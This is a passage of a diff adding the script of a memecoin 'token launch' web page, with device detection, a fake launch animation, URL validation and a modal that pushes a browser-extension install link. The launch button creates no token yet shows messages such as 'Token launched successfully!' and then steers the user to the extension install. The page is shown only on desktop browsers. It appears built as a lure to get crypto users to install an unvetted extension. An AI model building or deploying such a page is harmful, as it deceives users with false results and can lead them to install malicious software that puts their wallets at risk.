+      if (hasCoarsePointer && hasNoHover) return false;
+
+      return true;
+    }
+
+    const appShell = document.getElementById('appShell');
+    const mobileOverlay = document.getElementById('mobileOverlay');
+
+    function applyDeviceMode() {
+      if (isDesktopDevice()) {
+        appShell.style.display = 'flex';
+        mobileOverlay.style.display = 'none';
+        document.body.style.overflow = 'auto';
+      } else {
+        appShell.style.display = 'none';
+        mobileOverlay.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+      }
+    }
+
+    applyDeviceMode();
+
+    let resizeTimer;
+    window.addEventListener('resize', function() {
+      clearTimeout(resizeTimer);
+      resizeTimer = setTimeout(applyDeviceMode, 200);
+    });
+
+    window.addEventListener('orientationchange', function() {
+      setTimeout(applyDeviceMode, 300);
+    });
+
+    /* ============================================
+       LAUNCH LOGIC
+       ============================================ */
+    let launchCount = 0;
+    let isLaunching = false;
+    let currentToken = { name: 'Your Token', symbol: '$YOUR' };
+
+    const launchBtn = document.getElementById('launchBtn');
+    const tokenAvatar = document.getElementById('tokenAvatar');
+    const launchCountEl = document.getElementById('launchCount');
+    const statusToast = document.getElementById('statusToast');
+    const toastMessage = document.getElementById('toastMessage');
+
+    const modalBackdrop = document.getElementById('modalBackdrop');
+    const modalClose = document.getElementById('modalClose');
+    const installBtn = document.getElementById('installBtn');
+
+    const tokenNames = [
+      { name: 'MoonCat', symbol: '$MCAT' },
+      { name: 'DogeRocket', symbol: '$DRKT' },
+      { name: 'PepeCoin', symbol: '$PEPE' },
+      { name: 'ShibaMoon', symbol: '$SHIB' },
+      { name: 'FlokiRocket', symbol: '$FLOKI' },
+      { name: 'BonkToken', symbol: '$BONK' },
+      { name: 'WojakCoin', symbol: '$WOJAK' },
+      { name: 'ChadCoin', symbol: '$CHAD' },
+      { name: 'GigaChad', symbol: '$GIGA' },
+      { name: 'MoonShot', symbol: '$MOON' }
+    ];
+
+    const launchMessages = [
+      'Token launched successfully!',
+      'Deployed to bonding curve!',
+      'New token is live!',
+      'Token created. Time to moon!',
+      'Preparing your deployment...'
+    ];
+
+    /* ============================================
+       URL VALIDATION
+       ============================================ */
+    function isValidHttpUrl(string) {
+      try {
+        const url = new URL(string);
+        return url.protocol === "http:" || url.protocol === "https:";
+      } catch (_) {
+        return false;
+      }
+    }
+
+    function setupInstallLink() {
+      const url = EXTENSION_INSTALL_URL.trim();
+      if (!url.startsWith('http://') && !url.startsWith('https://')) {
+        console.warn('Extension install URL must start with http:// or https://');
+        installBtn.removeAttribute('href');
+        installBtn.style.opacity = '0.5';
+        installBtn.style.cursor = 'not-allowed';
+        installBtn.addEventListener('click', (e) => e.preventDefault());
+        return;
+      }
+      if (!isValidHttpUrl(url)) {
+        console.warn('Extension install URL is invalid.');
+        installBtn.removeAttribute('href');
+        installBtn.style.opacity = '0.5';
+        installBtn.style.cursor = 'not-allowed';
+        installBtn.addEventListener('click', (e) => e.preventDefault());
+        return;
+      }
+      installBtn.href = url;
+    }
+
+    setupInstallLink();
+
+    /* ============================================
+       BURST EFFECT
+       ============================================ */
+    function createBurst() {
+      const rect = tokenAvatar.getBoundingClientRect();
+      const centerX = rect.left + rect.width / 2;
+      const centerY = rect.top + rect.height / 2;
+      const particleCount = 16;
+
+      for (let i = 0; i < particleCount; i++) {
+        const particle = document.createElement('div');
+        particle.className = 'burst-particle';
+
+        const size = 4 + Math.random() * 6;
+        particle.style.width = size + 'px';
+        particle.style.height = size + 'px';
+        particle.style.left = centerX + 'px';
+        particle.style.top = centerY + 'px';
+
+        const shades = ['#00e87b', '#00c96b', '#4affa0', '#00a85a'];
+        particle.style.background = shades[Math.floor(Math.random() * shades.length)];
+
+        document.body.appendChild(particle);
+
+        const angle = (Math.PI * 2 * i) / particleCount + Math.random() * 0.5;
+        const distance = 60 + Math.random() * 100;
+        const dx = Math.cos(angle) * distance;
+        const dy = Math.sin(angle) * distance;
+
+        particle.style.transition = `transform 0.9s cubic-bezier(0.2, 0.8, 0.2, 1), opacity 0.9s ease`;
+
+        requestAnimationFrame(() => {
+          particle.style.transform = `translate(${dx}px, ${dy}px) scale(0.2)`;
+          particle.style.opacity = '0';
+        });
+
+        setTimeout(() => particle.remove(), 950);
+      }
+    }
+
+    /* ============================================
+       MODAL CONTROLS
+       ============================================ */
+    function openModal() {
+      modalBackdrop.classList.add('active');
+    }
+
+    function closeModal() {
+      modalBackdrop.classList.remove('active');
+    }
+
+    modalClose.addEventListener('click', closeModal);
+
+    modalBackdrop.addEventListener('click', (e) => {
+      if (e.target === modalBackdrop) {
+        closeModal();
+      }
+    });
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && modalBackdrop.classList.contains('active')) {
+        closeModal();
+      }
+    });
+
+    /* ============================================
+       LAUNCH FUNCTION
+       ============================================ */
+    function launchToken() {
+      if (isLaunching) return;
+      isLaunching = true;
+
+      launchBtn.disabled = true;
+
+      const token = tokenNames[Math.floor(Math.random() * tokenNames.length)];
+      currentToken = token;
+
+      document.getElementById('tokenName').textContent = token.name;
+      document.getElementById('tokenSymbol').textContent = token.symbol;
+
+      tokenAvatar.classList.remove('launching');
+      void tokenAvatar.offsetWidth;
+      tokenAvatar.classList.add('launching');
+
+      createBurst();
+
+      launchCount++;
+      launchCountEl.textContent = launchCount;
+
+      launchCountEl.style.transform = 'scale(1.4)';
+      launchCountEl.style.color = '#00e87b';
+      setTimeout(() => {
+        launchCountEl.style.transform = 'scale(1)';
+        launchCountEl.style.color = '';
+      }, 300);
+
+      const msg = launchMessages[Math.floor(Math.random() * launchMessages.length)];
+      toastMessage.textContent = msg;
+      statusToast.classList.add('visible');
+
+      setTimeout(() => {
+        tokenAvatar.classList.remove('launching');
+        tokenAvatar.innerHTML = '<i class="fas fa-coins"></i>';
+        launchBtn.disabled = false;
+        isLaunching = false;
+
+        setTimeout(() => {
+          statusToast.classList.remove('visible');
+        }, 2000);
+
+        // Open the extension install modal after the launch animation
+        setTimeout(() => {
+          openModal();
+        }, 500);
+      }, 1000);
+    }
+
+    /* ============================================
+       EVENT LISTENERS
+       ============================================ */
+    if (launchBtn) {
+      launchBtn.addEventListener('click', launchToken);
+
+      launchBtn.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter' || e.key === ' ') {
+          e.preventDefault();
+          launchToken();
+        }
+      });
+    }
+
+    document.querySelectorAll('.nav-link').forEach(link => {
+      link.addEventListener('click', function() {
+        document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+        this.classList.add('active');
+      });
+    });
+
+    /* ============================================
+       MOUSE PARALLAX ON ORBS
+       ============================================ */
+    const orb1 = document.querySelector('.orb-1');
+    const orb2 = document.querySelector('.orb-2');
+
+    document.addEventListener('mousemove', (e) => {
+      if (!orb1 || !orb2) return;
+      const x = (e.clientX / window.innerWidth - 0.5) * 30;
+      const y = (e.clientY / window.innerHeight - 0.5) * 30;
+
+      orb1.style.transform = `translate(${x}px, ${y}px) scale(1.05)`;
+      orb2.style.transform = `translate(${-x}px, ${-y}px) scale(1.05)`;
+    });
+  </script>
+</body>
+</html>
